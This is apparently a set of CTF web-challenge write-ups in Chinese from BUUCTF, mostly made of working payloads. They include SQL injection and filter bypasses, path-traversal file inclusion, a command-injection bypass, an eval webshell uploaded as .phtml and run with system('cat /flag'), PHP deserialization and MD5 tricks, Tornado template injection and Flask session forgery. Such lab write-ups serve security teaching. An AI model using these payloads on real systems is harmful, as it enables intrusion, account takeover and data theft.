## [极客大挑战 2019]EasySQL

试一下就可以发现后台是 select * from users where username='$_GET[username]' and password='$_GET[passwd]'

万能密码登录，得到flag。

万能密码：

username='=‘&password='='

username=\&password=='

username='=''%23&password=1

![image-20230407232743248](https://raw.githubusercontent.com/F4k34rch3r/pic-md/main/202304072327474.png)

## [极客大挑战 2019]Havefun

页面源码中有提示：

![image-20230407234234243](https://raw.githubusercontent.com/F4k34rch3r/pic-md/main/202304072342273.png)

![image-20230407234530855](https://raw.githubusercontent.com/F4k34rch3r/pic-md/main/202304072345875.png)

## [HCTF 2018]WarmUp

页面源码有提示：

![image-20230407235057514](https://raw.githubusercontent.com/F4k34rch3r/pic-md/main/202304072350537.png)

得到页面源码：

```
 <?php
    highlight_file(__FILE__);
    class emmm
    {
        public static function checkFile(&$page)
        {
            $whitelist = ["source"=>"source.php","hint"=>"hint.php"];
            if (! isset($page) || !is_string($page)) {
                echo "you can't see it";
                return false;
            }

            if (in_array($page, $whitelist)) {
                return true;
            }

            $_page = mb_substr(
                $page,
                0,
                mb_strpos($page . '?', '?')
            );
            if (in_array($_page, $whitelist)) {
                return true;
            }

            $_page = urldecode($page);
            $_page = mb_substr(
                $_page,
                0,
                mb_strpos($_page . '?', '?')
            );
            if (in_array($_page, $whitelist)) {
                return true;
            }
            echo "you can't see it";
            return false;
        }
    }

    if (! empty($_REQUEST['file'])
        && is_string($_REQUEST['file'])
        && emmm::checkFile($_REQUEST['file'])
    ) {
        include $_REQUEST['file'];
        exit;
    } else {
        echo "<br><img src=\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\" />";
    }  
?> 
```

![img](https://raw.githubusercontent.com/F4k34rch3r/pic-md/main/202304072353687.jpg)

源码中的白名单包括源码本身source.php和提示hint.php

hint.php：

flag not here, and flag in ffffllllaaaagggg

checkfile函数匹配包含文件白名单时先截取第一个问号前面的部分，构造source.php?/../../../../etc/passwd 可绕过文件名白名单。

![image-20230408001126427](https://raw.githubusercontent.com/F4k34rch3r/pic-md/main/202304080011452.png)

![image-20230408003711699](https://raw.githubusercontent.com/F4k34rch3r/pic-md/main/202304080037719.png)

## [ACTF2020 新生赛]Include

页面源码有提示：

![image-20230408003842849](https://raw.githubusercontent.com/F4k34rch3r/pic-md/main/202304080038880.png)

用php伪协议将源码base64编码后输出到页面，再解码得到flag：

![image-20230408004053914](https://raw.githubusercontent.com/F4k34rch3r/pic-md/main/202304080040936.png)

![image-20230408004144458](https://raw.githubusercontent.com/F4k34rch3r/pic-md/main/202304080041480.png)

## [ACTF2020 新生赛]Exec

没有任何过滤的命令执行：

![image-20230408005147373](https://raw.githubusercontent.com/F4k34rch3r/pic-md/main/202304080051400.png)

## [强网杯 2019]随便注

select被禁用

![image-20230408005815607](https://raw.githubusercontent.com/F4k34rch3r/pic-md/main/202304080058627.png)

可以用万能密码查看所有记录：

![image-20230408010338262](https://raw.githubusercontent.com/F4k34rch3r/pic-md/main/202304080103284.png)

可以堆叠注入：

![image-20230408010823824](https://raw.githubusercontent.com/F4k34rch3r/pic-md/main/202304080108854.png)

大概可看出，flag在表1919810931114514中，页面默认查询的是表words。

由于select被禁用，考虑将1919810931114514改名为words，将flag显示在页面上。

首先将字段名flag改为id【不必拘泥于words表中的两个字段id和data，只有一个字段id也可以利用万能密码全部显示】

 ![image-20230408011715800](https://raw.githubusercontent.com/F4k34rch3r/pic-md/main/202304080117826.png)

然后修改words表名的同时修改1919810931114514表名为words【改错就挂了】

```
f8ce56a6-4000-48e2-878e-c58319474118.node4.buuoj.cn:81/?inject=1';rename table words to x;rename table `1919810931114514` to words;
```

万能密码显示flag：

![image-20230408012722784](https://raw.githubusercontent.com/F4k34rch3r/pic-md/main/202304080127819.png)

## [GXYCTF2019]Ping Ping Ping

貌似是个正则匹配，类似f.\*l.\*a.*g，需要改变字母顺序才能绕过：

```
http://8535bb82-f8c2-409e-9e0c-60645b38280f.node4.buuoj.cn:81/?ip=127.0.0.1;a=g.php;b=fla;cat$IFS$b$a;
```

![image-20230408014252555](https://raw.githubusercontent.com/F4k34rch3r/pic-md/main/202304080142587.png)

## [SUCTF 2019]EasySQL

输入非零数字返回1，其他无回显。推断输入值被做了布尔运算，然后直接输出到页面。可控字符在from左边。

![image-20230408095854277](https://raw.githubusercontent.com/F4k34rch3r/pic-md/main/202304080958324.png)

可以堆叠注入：

```
query=1;show tables;
```

当前数据库只有一个表Flag，但from、flag被禁用。

直接用逗号分隔，*号输出表中所有字段，得到flag：

```
query=1;select *,1
```

![image-20230408111728488](https://raw.githubusercontent.com/F4k34rch3r/pic-md/main/202304081123818.png)

方法二：

布尔运算无非是与或非，猜测后面的值与flag有关，字母开头转换为数值0，根据非零输入返回1可猜测运算符为|，可修改其功能为字符串拼接，从而输出后面的字符串到页面。

```
query=1;set sql_mode=pipes_as_concat;select 1
```

![image-20230408112252130](https://raw.githubusercontent.com/F4k34rch3r/pic-md/main/202304081122154.png)

## [极客大挑战 2019]Secret File

源码中找到url，点进去还有url，再点就结束了。用burp抓包，发现中间有个302跳转，跳转前的页面里有文件名提示，访问看到页面源码。

![image-20230408122856225](https://raw.githubusercontent.com/F4k34rch3r/pic-md/main/202304081228250.png)

```
<html>
    <title>secret</title>
    <meta charset="UTF-8">
<?php
    highlight_file(__FILE__);
    error_reporting(0);
    $file=$_GET['file'];
    if(strstr($file,"../")||stristr($file, "tp")||stristr($file,"input")||stristr($file,"data")){
        echo "Oh no!";
        exit();
    }
    include($file); 
//flag放在了flag.php里
?>
</html>
```

直接用php伪协议查看flag.php源码，得到flag：

```
http://6d79b680-20d9-4441-b583-bd2263130be7.node4.buuoj.cn:81/secr3t.php?file=php://filter/read/convert.base64-encode/resource=flag.php
```

![image-20230408123605863](https://raw.githubusercontent.com/F4k34rch3r/pic-md/main/202304081236885.png)

## [极客大挑战 2019]LoveSQL

万能密码登录：

![image-20230408124207445](https://raw.githubusercontent.com/F4k34rch3r/pic-md/main/202304081242479.png)

页面给了密码密文，然而并没有什么用。

但是这里要考虑一下为什么密码会输出到页面上，一种情况是验证成功后又查询了一次密码；另一种情况是验证的同时查询到了密码。重点考虑后者。

```
Select * from xxx where username=$_GET[username] and password=$_GET[password]
```

尝试联合查询注入：

```
http://13a1beee-f30d-46b2-aa63-00bfd9d35b5f.node4.buuoj.cn:81/check.php?username=admin&password=81223ef680e39547560b1354d2af3d58'order by 4%23
http://13a1beee-f30d-46b2-aa63-00bfd9d35b5f.node4.buuoj.cn:81/check.php?username=1&password='union select 1,2,3%23
http://13a1beee-f30d-46b2-aa63-00bfd9d35b5f.node4.buuoj.cn:81/check.php?username=1&password='union select 1,2,group_concat(table_name,0x2b,column_name)from information_schema.columns where table_schema=database()%23
#'geekuser+id,geekuser+username,geekuser+password,l0ve1ysq1+id,l0ve1ysq1+username,l0ve1ysq1+password'
http://13a1beee-f30d-46b2-aa63-00bfd9d35b5f.node4.buuoj.cn:81/check.php?username=1&password='union select 1,2,group_concat(password)from l0ve1ysq1%23
#Your password is 'wo_tai_nan_le,glzjin_wants_a_girlfriend,biao_ge_dddd_hm,linux_chuang_shi_ren,a_rua_rain,yan_shi_fu_de_mao_bo_he,cl4y,di_2_kuai_fu_ji,di_3_kuai_fu_ji,di_4_kuai_fu_ji,di_5_kuai_fu_ji,di_6_kuai_fu_ji,di_7_kuai_fu_ji,di_8_kuai_fu_ji,Syc_san_da_hacker,flag{e0d35709-ea21-4072-bc4b-a5d91c0d1737}'
```

## [极客大挑战 2019]Http

在页面源码中找到提示：

![image-20230408125923174](https://raw.githubusercontent.com/F4k34rch3r/pic-md/main/202304081259207.png)

按提示修改Referer、UserAgent、X-Forwarded-For，得到flag：

![image-20230408130257715](https://raw.githubusercontent.com/F4k34rch3r/pic-md/main/202304081302735.png)

## [极客大挑战 2019]Knife

# 我家菜刀丢了，你能帮我找一下么

eval($_POST["Syc"]);

这也没丢啊，都直接给说密码了，后门也就在index.php里。蚁剑连接，在根目录看到flag文件。

![image-20230408132803658](https://raw.githubusercontent.com/F4k34rch3r/pic-md/main/202304081328680.png)

## [极客大挑战 2019]Upload

随便上传一个图片，竟然报错：

```
 NO! HACKER! your file included '<?' 
```

可见后台对图片内容过滤了 <? 而我用Photoshop生成的图片里面自带很多xml格式的信息，所以被误伤了。用Photoshop生成图片时元数据为“无”即可消除这些信息。

考虑用以下一句话木马绕过：

```
<script language="php">@eval($_POST[c]);</script>
```

简单尝试几次，发现可以上传phtml文件

![image-20230408135143890](https://raw.githubusercontent.com/F4k34rch3r/pic-md/main/202304081351915.png)

```
http://ea10f465-71e7-43c6-a16b-ca214555a6f7.node4.buuoj.cn:81/upload/logo.phtml
c=phpinfo();
```

一句话木马执行成功！

```
c=system('cat /flag');
```

直接看到flag，或者用蚁剑翻目录。

## [ACTF2020 新生赛]Upload

可以上传pht文件：

![image-20230408135750684](https://raw.githubusercontent.com/F4k34rch3r/pic-md/main/202304081357710.png)

但不解析。上传phtml文件可解析。

![image-20230408135940071](https://raw.githubusercontent.com/F4k34rch3r/pic-md/main/202304081417348.png)

## [极客大挑战 2019]BabySQL

Union、select、or被删除，可以双写绕过。

```
http://570a4fdd-6564-42af-be03-8830c3bbaad8.node4.buuoj.cn:81/check.php?username=admin'oorrder bory 4%23&password=123456
http://570a4fdd-6564-42af-be03-8830c3bbaad8.node4.buuoj.cn:81/check.php?username='unioron seorlect 1,2,3%23&password=123456
http://570a4fdd-6564-42af-be03-8830c3bbaad8.node4.buuoj.cn:81/check.php?username='unioron seorlect 1,2,group_concat(table_name,0x2b,column_name)frorom infoorrmation_schema.columns wheorre table_schema=database()%23&password=123456
#Your password is 'b4bsql+id,b4bsql+username,b4bsql+password,geekuser+id,geekuser+username,geekuser+password'
http://570a4fdd-6564-42af-be03-8830c3bbaad8.node4.buuoj.cn:81/check.php?username='unioron seorlect 1,2,group_concat(passwoorrd)frorom b4bsql%23&password=123456
#Your password is 'i_want_to_play_2077,sql_injection_is_so_fun,do_you_know_pornhub,github_is_different_from_pornhub,you_found_flag_so_stop,i_told_you_to_stop,hack_by_cl4y,flag{b9531139-550b-423c-ab4c-14527649d576}'
```

## [极客大挑战 2019]PHP

因为每次猫猫都在我键盘上乱跳，所以我有一个良好的备份网站的习惯    

目录扫描，找到网站备份文件www.zip和flag.php。

```
python3 dirsearch.py -u http://6d5ebad8-4150-4401-a45e-f088a4176714.node4.buuoj.cn:81/ --max-rate=10

[14:44:36] 200 -    0B  - /flag.php                                         
[14:45:39] 200 -   10KB - /index.js                                         
[14:46:30] 429 -  568B  - /linkadmin.php                                    
[14:50:49] 429 -  568B  - /sites/all/libraries/README.txt                   
[14:53:38] 200 -    6KB - /www.zip  
```

index.php

```
    <?php
    include 'class.php';
    $select = $_GET['select'];
    $res=unserialize(@$select);
    ?>  
```

class.php

```
class Name{
    private $username = 'nonono';
    private $password = 'yesyes';

    public function __construct($username,$password){
        $this->username = $username;
        $this->password = $password;
    }

    function __wakeup(){
        $this->username = 'guest';
    }

    function __destruct(){
        if ($this->password != 100) {
            echo "</br>NO!!!hacker!!!</br>";
            echo "You name is: ";
            echo $this->username;echo "</br>";
            echo "You password is: ";
            echo $this->password;echo "</br>";
            die();
        }
        if ($this->username === 'admin') {
            global $flag;
            echo $flag;
        }else{
            echo "</br>hello my friend~~</br>sorry i can't give you the flag!";
            die();

            
        }
    }
}
?>
```

构造对象，用户名为admin、密码为100。

```
<?php
include 'flag.php';


error_reporting(0);


class Name{
    private $username = 'admin';
    private $password = '100';
}
echo serialize(new Name()); 
#O:4:"Name":2:{s:14:"Nameusername";s:5:"admin";s:14:"Namepassword";s:3:"100";}
#脚本输出不显示空字符，需要手工添加。
```

反序列化触发wakeup函数会修改用户名，把属性个数2改为3即可绕过，不触发wakeup函数。

```
http://445cc29c-ef01-4065-8624-fe5e7f2b5db2.node4.buuoj.cn:81/?select=O:4:"Name":3:{s:14:"%00Name%00username";s:5:"admin";s:14:"%00Name%00password";s:3:"100";}
# flag{c4c0f14c-bb30-4eef-9a66-4d3cea23f835} 
```

## [ACTF2020 新生赛]BackupFile

找到 index.php.bak

```
if(isset($_GET['key'])) {
    $key = $_GET['key'];
    if(!is_numeric($key)) {
        exit("Just num!");
    }   
    $key = intval($key);
    $str = "123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3";
    if($key == $str) {
        echo $flag;
    }   
}
else {
    echo "Try to find out source file!";
}
```

易得：

```
http://aeeab0b5-2a13-4081-bb59-e20478ff9d9b.node4.buuoj.cn:81/?key=123
#flag{df91da2b-687a-481d-ad32-e5245d5bb819} 
```

## [RoarCTF 2019]Easy Calc

抓包看到计算器实际执行的脚本calc.php

```
<?php
error_reporting(0);
if(!isset($_GET['num'])){
    show_source(__FILE__);
}else{
        $str = $_GET['num'];
        $blacklist = [' ', '\t', '\r', '\n','\'', '"', '`', '\[', '\]','\$','\\','\^'];
        foreach ($blacklist as $blackitem) {
                if (preg_match('/' . $blackitem . '/m', $str)) {
                        die("what are you want to do?");
                }
        }
        eval('echo '.$str.';');
}
?> 
```

代码审计发现过滤并不严格，但经常出现403。主页源码有个WAF的提示：

```
<!--I've set up WAF to ensure security.-->
```

GET参数名前面加空格可以绕过WAF：

```
http://node4.buuoj.cn:25488/calc.php? num=phpinfo()
node4.buuoj.cn:25535/calc.php? num=serialize(scandir(chr(47)))
#a:24:{i:0;s:1:".";i:1;s:2:"..";i:2;s:10:".dockerenv";i:3;s:3:"bin";i:4;s:4:"boot";i:5;s:3:"dev";i:6;s:3:"etc";i:7;s:5:"f1agg";i:8;s:4:"home";i:9;s:3:"lib";i:10;s:5:"lib64";i:11;s:5:"media";i:12;s:3:"mnt";i:13;s:3:"opt";i:14;s:4:"proc";i:15;s:4:"root";i:16;s:3:"run";i:17;s:4:"sbin";i:18;s:3:"srv";i:19;s:8:"start.sh";i:20;s:3:"sys";i:21;s:3:"tmp";i:22;s:3:"usr";i:23;s:3:"var";}
node4.buuoj.cn:25535/calc.php? num=file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103))
#flag{13fb16f5-07f6-44be-96da-940efcdd2417} 
```

## [极客大挑战 2019]BuyFlag

Pay.php

Flag need your 100000000 money

If you want to buy the FLAG:
You must be a student from CUIT!!!
You must be answer the correct password!!! 	 							

Only Cuit's students can buy the FLAG

源码提示：

```
<!--
	~~~post money and password~~~
if (isset($_POST['password'])) {
	$password = $_POST['password'];
	if (is_numeric($password)) {
		echo "password can't be number</br>";
	}elseif ($password == 404) {
		echo "Password Right!</br>";
	}
}
-->
```

第一次访问不要着急改包，改成POST再访问一次，抓包发现cookie: user=0，改成1。

```
password=404x&money=100000000
```

提示Nember lenth is too long

```
password=404x&money=1E9
#flag{77532898-106c-40dc-a13e-3f82e77fd2a3}
```

## [BJDCTF2020]Easy MD5

http响应头有提示：

```
Hint: select * from 'admin' where password=md5($pass,true)
```

用于md5($pass,true)的特殊的明文：

```
ffifdyop
129581926211651571912466741651878684928
e58
4611686052576742364
```

小知识：

![image-20230409104004777](https://raw.githubusercontent.com/F4k34rch3r/pic-md/main/202304091040290.png)

```
http://f06c1733-a6dc-48a2-9967-1202a42627fa.node4.buuoj.cn:81/leveldo4.php?password=ffifdyop
```

页面跳转，出现新提示：

```
<!--
$a = $GET['a'];
$b = $_GET['b'];

if($a != $b && md5($a) == md5($b)){
    // wow, glzjin wants a girl friend.
-->
```

用0e漏洞：

```
240610708 0e462097431906509019562988736854
314282422 0e990995504821699494520356953734
571579406 0e972379832854295224118025748221
903251147 0e174510503823932942361353209384
1110242161 0e435874558488625891324861198103
1320830526 0e912095958985483346995414060832
1586264293 0e622743671155995737639662718498
2302756269 0e250566888497473798724426794462
2427435592 0e067696952328669732475498472343
2653531602 0e877487522341544758028810610885
3293867441 0e471001201303602543921144570260
3295421201 0e703870333002232681239618856220
```

```
http://f06c1733-a6dc-48a2-9967-1202a42627fa.node4.buuoj.cn:81/levels91.php?a=240610708&b=314282422
```

也可以用数组绕过：

```
http://f06c1733-a6dc-48a2-9967-1202a42627fa.node4.buuoj.cn:81/levels91.php?a[]=1&b[]=
```

页面跳转，出现新提示：

```
 <?php
error_reporting(0);
include "flag.php";

highlight_file(__FILE__);

if($_POST['param1']!==$_POST['param2']&&md5($_POST['param1'])===md5($_POST['param2'])){
    echo $flag;
} 
```

没有禁用数组，还是数组绕过：

```
http://f06c1733-a6dc-48a2-9967-1202a42627fa.node4.buuoj.cn:81/levell14.php
param1[]=1&param2[]=
 flag{40d54be7-9cde-4838-80d3-62d8588e6261} 
```

其实此类题目都可以用md5碰撞解决：

```
两个相同md5字符串的url编码：
a=~b%846%86%AB%EB%A6%1D%ED%26%94%16%5E%03K0%E1%5C%EE%AF%5B%D5%17T%8A%3A%8EL%A4%B3%B8%1B%EE%BC%EE%E0%23%EA%5E%8F%3E%D7%A4%082%AD%11%9D%7D%C4%5DD%04%F6%B53%F0%F18a%29%81%8FG0%A1EBF%F5%DC%0F%90%85AM%0C7%0F~%DF%C4a%0B%06%26%9F%CB%1A%FE%BB%EC%07%FE%E7%E8%5C%A6%95%F4J%08%40j~A%EF%D2%7C%CB%EC%1B%AE%A5%84%80%BF-%A1%08%A4%3C%22%5E%7B%A1%D1

b=~b%846%86%AB%EB%A6%1D%ED%26%94%16%5E%03K0%E1%5Cn%AF%5B%D5%17T%8A%3A%8EL%A4%B3%B8%1B%EE%BC%EE%E0%23%EA%5E%8F%3E%D7%A4%08%B2%AD%11%9D%7D%C4%5DD%04%F6%B53%F0%F1%B8a%29%81%8FG0%A1EBF%F5%DC%0F%90%85AM%0C7%0F~%DF%C4%E1%0B%06%26%9F%CB%1A%FE%BB%EC%07%FE%E7%E8%5C%A6%95%F4J%08%40j~A%EF%D2%FC%CA%EC%1B%AE%A5%84%80%BF-%A1%08%A4%3C%A2%5E%7B%A1%D1

三个：
a=%af%13%76%70%82%a0%a6%58%cb%3e%23%38%c4%c6%db%8b%60%2c%bb%90%68%a0%2d%e9%47%aa%78%49%6e%0a%c0%c0%31%d3%fb%cb%82%25%92%0d%cf%61%67%64%e8%cd%7d%47%ba%0e%5d%1b%9c%1c%5c%cd%07%2d%f7%a8%2d%1d%bc%5e%2c%06%46%3a%0f%2d%4b%e9%20%1d%29%66%a4%e1%8b%7d%0c%f5%ef%97%b6%ee%48%dd%0e%09%aa%e5%4d%6a%5d%6d%75%77%72%cf%47%16%a2%06%72%71%c9%a1%8f%00%f6%9d%ee%54%27%71%be%c8%c3%8f%93%e3%52%73%73%53%a0%5f%69%ef%c3%3b%ea%ee%70%71%ae%2a%21%c8%44%d7%22%87%9f%be%79%6d%c4%61%a4%08%57%02%82%2a%ef%36%95%da%ee%13%bc%fb%7e%a3%59%45%ef%25%67%3c%e0%27%69%2b%95%77%b8%cd%dc%4f%de%73%24%e8%ab%66%74%d2%8c%68%06%80%0c%dd%74%ae%31%05%d1%15%7d%c4%5e%bc%0b%0f%21%23%a4%96%7c%17%12%d1%2b%b3%10%b7%37%60%68%d7%cb%35%5a%54%97%08%0d%54%78%49%d0%93%c3%b3%fd%1f%0b%35%11%9d%96%1d%ba%64%e0%86%ad%ef%52%98%2d%84%12%77%bb%ab%e8%64%da%a3%65%55%5d%d5%76%55%57%46%6c%89%c9%df%b2%3c%85%97%1e%f6%38%66%c9%17%22%e7%ea%c9%f5%d2%e0%14%d8%35%4f%0a%5c%34%d3%73%a5%98%f7%66%72%aa%43%e3%bd%a2%cd%62%fd%69%1d%34%30%57%52%ab%41%b1%91%65%f2%30%7f%cf%c6%a1%8c%fb%dc%c4%8f%61%a5%93%40%1a%13%d1%09%c5%e0%f7%87%5f%48%e7%d7%b3%62%04%a7%c4%cb%fd%f4%ff%cf%3b%74%28%1c%96%8e%09%73%3a%9b%a6%2f%ed%b7%99%d5%b9%05%39%95%ab

b=%af%13%76%70%82%a0%a6%58%cb%3e%23%38%c4%c6%db%8b%60%2c%bb%90%68%a0%2d%e9%47%aa%78%49%6e%0a%c0%c0%31%d3%fb%cb%82%25%92%0d%cf%61%67%64%e8%cd%7d%47%ba%0e%5d%1b%9c%1c%5c%cd%07%2d%f7%a8%2d%1d%bc%5e%2c%06%46%3a%0f%2d%4b%e9%20%1d%29%66%a4%e1%8b%7d%0c%f5%ef%97%b6%ee%48%dd%0e%09%aa%e5%4d%6a%5d%6d%75%77%72%cf%47%16%a2%06%72%71%c9%a1%8f%00%f6%9d%ee%54%27%71%be%c8%c3%8f%93%e3%52%73%73%53%a0%5f%69%ef%c3%3b%ea%ee%70%71%ae%2a%21%c8%44%d7%22%87%9f%be%79%6d%c4%61%a4%08%57%02%82%2a%ef%36%95%da%ee%13%bc%fb%7e%a3%59%45%ef%25%67%3c%e0%27%69%2b%95%77%b8%cd%dc%4f%de%73%24%e8%ab%66%74%d2%8c%68%06%80%0c%dd%74%ae%31%05%d1%15%7d%c4%5e%bc%0b%0f%21%23%a4%96%7c%17%12%d1%2b%b3%10%b7%37%60%68%d7%cb%35%5a%54%97%08%0d%54%78%49%d0%93%c3%b3%fd%1f%0b%35%11%9d%96%1d%ba%64%e0%86%ad%ef%52%98%2d%84%12%77%bb%ab%e8%64%da%a3%65%55%5d%d5%76%55%57%46%6c%89%c9%5f%b2%3c%85%97%1e%f6%38%66%c9%17%22%e7%ea%c9%f5%d2%e0%14%d8%35%4f%0a%5c%34%d3%f3%a5%98%f7%66%72%aa%43%e3%bd%a2%cd%62%fd%e9%1d%34%30%57%52%ab%41%b1%91%65%f2%30%7f%cf%c6%a1%8c%fb%dc%c4%8f%61%a5%13%40%1a%13%d1%09%c5%e0%f7%87%5f%48%e7%d7%b3%62%04%a7%c4%cb%fd%f4%ff%cf%3b%74%a8%1b%96%8e%09%73%3a%9b%a6%2f%ed%b7%99%d5%39%05%39%95%ab

c=%af%13%76%70%82%a0%a6%58%cb%3e%23%38%c4%c6%db%8b%60%2c%bb%90%68%a0%2d%e9%47%aa%78%49%6e%0a%c0%c0%31%d3%fb%cb%82%25%92%0d%cf%61%67%64%e8%cd%7d%47%ba%0e%5d%1b%9c%1c%5c%cd%07%2d%f7%a8%2d%1d%bc%5e%2c%06%46%3a%0f%2d%4b%e9%20%1d%29%66%a4%e1%8b%7d%0c%f5%ef%97%b6%ee%48%dd%0e%09%aa%e5%4d%6a%5d%6d%75%77%72%cf%47%16%a2%06%72%71%c9%a1%8f%00%f6%9d%ee%54%27%71%be%c8%c3%8f%93%e3%52%73%73%53%a0%5f%69%ef%c3%3b%ea%ee%70%71%ae%2a%21%c8%44%d7%22%87%9f%be%79%ed%c4%61%a4%08%57%02%82%2a%ef%36%95%da%ee%13%bc%fb%7e%a3%59%45%ef%25%67%3c%e0%a7%69%2b%95%77%b8%cd%dc%4f%de%73%24%e8%ab%e6%74%d2%8c%68%06%80%0c%dd%74%ae%31%05%d1%15%7d%c4%5e%bc%0b%0f%21%23%a4%16%7c%17%12%d1%2b%b3%10%b7%37%60%68%d7%cb%35%5a%54%97%08%0d%54%78%49%d0%93%c3%33%fd%1f%0b%35%11%9d%96%1d%ba%64%e0%86%ad%6f%52%98%2d%84%12%77%bb%ab%e8%64%da%a3%65%55%5d%d5%76%55%57%46%6c%89%c9%df%b2%3c%85%97%1e%f6%38%66%c9%17%22%e7%ea%c9%f5%d2%e0%14%d8%35%4f%0a%5c%34%d3%73%a5%98%f7%66%72%aa%43%e3%bd%a2%cd%62%fd%69%1d%34%30%57%52%ab%41%b1%91%65%f2%30%7f%cf%c6%a1%8c%fb%dc%c4%8f%61%a5%93%40%1a%13%d1%09%c5%e0%f7%87%5f%48%e7%d7%b3%62%04%a7%c4%cb%fd%f4%ff%cf%3b%74%28%1c%96%8e%09%73%3a%9b%a6%2f%ed%b7%99%d5%b9%05%39%95%ab
```

## [护网杯 2018]easy_tornado

```
http://1c95d1e9-b281-40ef-994d-92e08d869293.node4.buuoj.cn:81/file?filename=/flag.txt&filehash=97dd75695d91c287b2fe25eb1415e308
#flag in /fllllllllllllag
http://1c95d1e9-b281-40ef-994d-92e08d869293.node4.buuoj.cn:81/file?filename=/welcome.txt&filehash=f68e451d4b310cebb7ac875551d66f8f
#render
http://1c95d1e9-b281-40ef-994d-92e08d869293.node4.buuoj.cn:81/file?filename=/hints.txt&filehash=5d3b2725d70cacc2c902c8540bc869a3
md5(cookie_secret+md5(filename))
```

flag应该是在 /fllllllllllllag 中，但哈希值不对会报错。注意跳转的报错页面：

```
http://1c95d1e9-b281-40ef-994d-92e08d869293.node4.buuoj.cn:81/error?msg=Error
```

检测是否存在SSTI模板注入：

```
http://1c95d1e9-b281-40ef-994d-92e08d869293.node4.buuoj.cn:81/error?msg=Error{{5*6}}
ORZ
http://1c95d1e9-b281-40ef-994d-92e08d869293.node4.buuoj.cn:81/error?msg=Error{{5^6}}
Error3
```

tornado模板注入：

```
request
handler.settings  （secretkey在这个里面）
datetime
```

```
http://1c95d1e9-b281-40ef-994d-92e08d869293.node4.buuoj.cn:81/error?msg=Error{{handler.settings}}
#Error{'autoreload': True, 'compiled_template_cache': False, 'cookie_secret': '7a72647d-22c3-47b4-a2fa-79a0f9f4000d'} 
```

得到cookie_secret，计算哈希，得到flag：

```
echo -n "7a72647d-22c3-47b4-a2fa-79a0f9f4000d`echo -n /hints.txt|md5`"|md5
#5d3b2725d70cacc2c902c8540bc869a3
echo -n "7a72647d-22c3-47b4-a2fa-79a0f9f4000d`echo -n /fllllllllllllag|md5`"|md5
#08b1ca5536ad830d75296b8f905f749d
```

```
http://1c95d1e9-b281-40ef-994d-92e08d869293.node4.buuoj.cn:81/file?filename=/fllllllllllllag&filehash=08b1ca5536ad830d75296b8f905f749d
#flag{dab42487-1544-43e0-9c90-e2dd9f498e03}
```

## [HCTF 2018]admin

注册登录，可以修改密码。源码有提示：

```
<!-- you are not admin -->
```

修改密码的页面找到提示：

```
<!-- https://github.com/woadsl1234/hctf_flask/ -->
```

去github找到源码，发现修改密码前调用了 name = strlower(session['name'])，此处未使用python的lower函数，自定义函数如下：

```
def strlower(username):
    username = nodeprep.prepare(username)
    return username
```

nodeprep.prepare 函数也是把大写改成小写，但是unicode字符也会被改成小写字母：

```
https://symbl.cc/en/search/?q=Modifier+Letter+Capital
ᴬᴮꟲᴰᴱꟳᴳᴴᴵᴶᴷᴸᴹᴺᴼᴾꟴᴿᵀᵁᵂⱽ
```

unicode欺骗：注册ᴬdmin，修改密码，然后用此密码登录admin，看到flag。

方法二：flask session伪造

查看cookie：

```
Cookie: session=.eJw9kEuLwkAQhP_K0mcPSSQXwYPLxJBAz6DkwcxFfMTEmcSFqDi2-N-31wXPVf1VVT9hcxybSwez63hrJrA5HWD2hK8dzEDbxEvb9SiyUIokwMg4aVuSxSKWQxlgvSKk0ktaDyrFhy4OvabcSVE-9GA6pCxEakOMMlL1KsCinPLt3VgXyzTvDLNMipEU-4cqVoEqKofUWxTfToksNqm0qtYkqep10XLWsmO_Zw_32DMziXRd9Uokc3hNYH8Zj5vrj2vOnwlI2puaq1nN-GWn6tyhwFCla46pnEzLP22qKYl5QmwEz7nP37jTsG2bD2ldmRwX_8p5O7AA3nuYwO3SjO-vQRjA6xdcX21d.ZDJfLQ.ZCBKC1Ipe7JNn_MrGtDnXl66kU0
```

conf.py

```
import os

class Config(object):
    SECRET_KEY = os.environ.get('SECRET_KEY') or 'ckj123'
    SQLALCHEMY_DATABASE_URI = 'mysql+pymysql://root:adsl1234@db:3306/test'
    SQLALCHEMY_TRACK_MODIFICATIONS = True
```

找到签名密钥secret_key为ckj123

```
python3 flask_session_cookie_manager3.py decode -s 'ckj123' -c '.eJw9kEuLwkAQhP_K0mcPSSQXwYPLxJBAz6DkwcxFfMTEmcSFqDi2-N-31wXPVf1VVT9hcxybSwez63hrJrA5HWD2hK8dzEDbxEvb9SiyUIokwMg4aVuSxSKWQxlgvSKk0ktaDyrFhy4OvabcSVE-9GA6pCxEakOMMlL1KsCinPLt3VgXyzTvDLNMipEU-4cqVoEqKofUWxTfToksNqm0qtYkqep10XLWsmO_Zw_32DMziXRd9Uokc3hNYH8Zj5vrj2vOnwlI2puaq1nN-GWn6tyhwFCla46pnEzLP22qKYl5QmwEz7nP37jTsG2bD2ldmRwX_8p5O7AA3nuYwO3SjO-vQRjA6xdcX21d.ZDJfLQ.ZCBKC1Ipe7JNn_MrGtDnXl66kU0'
#{'_fresh': True, '_id': b'b1168e0254143fd6835096e41d335174f8c2a7ec2d452bfa3253853b39d4157500f994baf83dc647294495d39c00d829dcc9f375ea8331adc139d6739a6aee81', 'csrf_token': b'361ec2b6491a9bd0358dc05d4e2b67c198c9d517', 'image': b'EVI0', 'name': 'xxx', 'user_id': '10'}
```

name改成admin：

```
python3 flask_session_cookie_manager3.py encode -s 'ckj123' -t "{'_fresh': True, '_id': b'b1168e0254143fd6835096e41d335174f8c2a7ec2d452bfa3253853b39d4157500f994baf83dc647294495d39c00d829dcc9f375ea8331adc139d6739a6aee81', 'csrf_token': b'361ec2b6491a9bd0358dc05d4e2b67c198c9d517', 'image': b'EVI0', 'name': 'admin', 'user_id': '10'}"
